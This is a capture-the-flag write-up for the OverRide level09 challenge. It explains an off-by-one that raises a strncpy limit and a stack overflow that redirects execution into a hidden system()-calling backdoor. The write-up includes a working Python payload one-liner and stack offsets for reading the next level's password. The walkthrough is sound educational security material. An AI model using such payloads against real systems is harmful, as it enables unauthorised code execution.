
RELRO               STACK CANARY        NX                PIE                RPATH        RUNPATH         FILE
Partial RELRO 🟡  No canary found 🔴     NX enabled 🟢     PIE enabled 🟢     No RPATH 🟢   No RUNPATH 🟢   /home/users/level09/level09

------------

# OverRide Level09 Log 🏴

## Overview

This is a **binary exploitation** challenge on 64-bit Linux. The goal is to read
`/home/users/end/.pass` by exploiting a vulnerability in the `level09` program.

---

## Step 1: Recon — understand what the program does

Run it:
```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: thao
>: Welcome, thao
>: Msg @Unix-Dude
>>: hello
>: Msg sent!
```

The program is simple: enter a username → enter a message → send. Nothing
special... **but the code tells a different story!**

---

## Step 2: Read the code (Ghidra decompile)

There are 4 important functions:

### 🔑 `secret_backdoor` — a hidden function that is never called
```c
void secret_backdoor(void) {
    char local_88[128];
    fgets(local_88, 0x80, stdin);
    system(local_88);  // ← runs any shell command!
}
```
This function is **never called** in the normal flow, but if we can jump into it
we can run arbitrary commands → read the flag!

---

### 🏠 `handle_msg` — the central function
```c
void handle_msg(void) {
    undefined1 local_c8[140];  // ← main buffer, used as a struct
    // ...
    undefined4 local_14 = 0x8c;  // ← the limit value, at offset +0xb4
    
    set_username(local_c8);
    set_msg(local_c8);
}
```

The buffer `local_c8` is used as a **struct** with this layout:
```
Offset 0x00 → 0x8b  : message area (140 bytes)
Offset 0x8c → 0xb3  : username area (40 bytes)  
Offset 0xb4         : local_14 = 0x8c = 140 (the copy limit)
```

---

### 👤 `set_username` — contains the first vulnerability
```c
void set_username(long param_1) {
    char local_98[140];
    int local_c;
    
    fgets(local_98, 0x80, stdin);  // read up to 128 bytes
    
    // Loop copying into param_1 + 0x8c (the username area)
    for (local_c = 0; (local_c < 0x29 && local_98[local_c] != '\0'); local_c++) {
        *(char*)(param_1 + 0x8c + local_c) = local_98[local_c];
    }
}
```

**Key point:** `0x29 = 41` iterations, writing into `param_1 + 0x8c + 0` through
`param_1 + 0x8c + 40`.

But `local_14` lives at `param_1 + 0xb4`:
```
0x8c + 40 = 0x8c + 0x28 = 0xb4  ✓
```
→ **The 41st byte of the username writes exactly into `local_14`!**

If the 41st byte is `\xff` (= 255), `local_14` changes from `140` to `255`.

---

### ✉️ `set_msg` — contains the second vulnerability
```c
void set_msg(char *param_1) {
    char local_408[1024];
    
    fgets(local_408, 0x400, stdin);  // read up to 1024 bytes
    strncpy(param_1, local_408, (long)*(int*)(param_1 + 0xb4));
    //                           ↑ reads local_14 as the limit!
}
```

`strncpy` copies at most `local_14` bytes. If we changed `local_14` to `255`, it
copies **255 bytes** into a buffer only 140 bytes wide → **buffer overflow!**

---

## Step 3: Map the stack

```
handle_msg stack frame:
┌─────────────────────────────┐  ← rbp - 0xc0
│  local_c8[140]              │  offset +0x00: message (140 bytes)
│  ...                        │
│  ───────────── offset 0x8c  │  ← username area begins
│  username[40]               │  40 bytes
│  ───────────── offset 0xb4  │
│  local_14 = 0x8c (4 bytes)  │  ← overwritten by username[40]
│  ...padding...              │
├─────────────────────────────┤  ← rbp
│  saved RBP (8 bytes)        │
├─────────────────────────────┤  ← rbp + 8
│  return address (8 bytes)   │  ← TARGET TO OVERWRITE
└─────────────────────────────┘
```

**Offset from the start of the buffer to the return address:**
- `local_c8` is at `rbp - 0xc0` → `0xc0 = 192` bytes from rbp
- the return address is at `rbp + 8`
- total: `192 + 8 = 200` bytes of padding, then the return address

---

## Step 4: Check protections

```bash
# checksec result:
Partial RELRO 🟡  
No canary    🔴  ← no stack canary → overflow is easier!
NX enabled   🟢  ← can't execute injected shellcode directly
PIE enabled  🟢  ← addresses change on every run
```

**PIE enabled** is the challenge: the address of `secret_backdoor` is not fixed.

---

## Step 5: Find the real address of secret_backdoor

Because of PIE, we need the **base address** at runtime:

```bash
gdb -q ./level09
(gdb) break main
(gdb) run
(gdb) info proc mappings
# → Start Addr: 0x555555554000  ← this is the base!

(gdb) p secret_backdoor
# → offset: 0x88c
```

Real address:
```
0x555555554000 + 0x88c = 0x55555555488c
```

Check ASLR:
```bash
cat /proc/sys/kernel/randomize_va_space
# → 0  ← ASLR is off! The address is fixed on every run → stable exploit
```

---

## Step 6: Build the payload

The exploit has **3 parts** sent to stdin:

```
Part 1 - USERNAME:
'A' × 40 + '\xff'
└─ 40 normal characters to fill the username area
└─ the '\xff' byte = 255 written into local_14, raising the strncpy limit to 255

Part 2 - MESSAGE:
'B' × 200 + secret_backdoor_address (8 bytes, little-endian)
└─ 200 bytes of padding to reach the return address
└─ 8 bytes of address to overwrite the return address

Part 3 - COMMAND (after jumping into secret_backdoor):
'cat /home/users/end/.pass\n'
└─ secret_backdoor calls fgets then system() with this input
```

---

## Step 7: Run the exploit

```bash
# Step 1: overflow payload + keep stdin open
(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09

# Step 2: after secret_backdoor() calls fgets(), type the command you want to run:
cat /home/users/end/.pass | cat
```

- little-endian = x86 stores bytes from low to high
- `0x55555555488c` becomes `\x8c\x48\x55\x55\x55\x55\x00\x00`

---

## Attack flow diagram

```
set_username()                    set_msg()
     │                                │
     │  username = 'A'*40 + '\xff'    │  msg = 'B'*200 + addr
     │                                │
     ▼                                ▼
local_14 changed             strncpy copies 255 bytes
  0x8c → 0xff                  overflows past saved RBP
                                  └→ overwrites return address
                                         │
                                         ▼
                               ret jumps into secret_backdoor()
                                         │
                                         ▼
                               fgets() reads "cat /home/users/end/.pass"
                                         │
                                         ▼
                               system() runs the command → prints the flag! 🎉
```

---

## Vulnerability summary

| Vulnerability | Location | Cause |
|---|---|---|
| Off-by-one | `set_username` | Loop runs to `0x29=41` but the username is only 40 bytes |
| Buffer overflow | `set_msg` | `strncpy` uses an attacker-controlled length |
| No canary | Binary | Stack overflow goes undetected |
